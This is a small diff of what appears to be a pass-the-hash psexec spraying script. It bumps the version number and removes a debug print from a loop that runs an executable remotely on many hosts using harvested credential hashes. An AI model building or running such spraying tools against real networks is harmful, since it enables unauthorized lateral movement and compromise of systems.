@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# 1.3
+# 1.4
 import psexec
 import time
 import blessings
@@ -102,7 +102,6 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
         if want_to_psexec.lower() == "y" or want_to_psexec == "":
             for hash in workinghashes:
                 psexechash, psexecip = hash.split(",")
-                print exeFile, targetusername, psexechash, targetdomain, psexecip
                 b = multiprocessing.Process(
                     target=StartPsexec, args=(exeFile, targetusername, psexechash, targetdomain, psexecip))
                 if __name__ == "__main__":
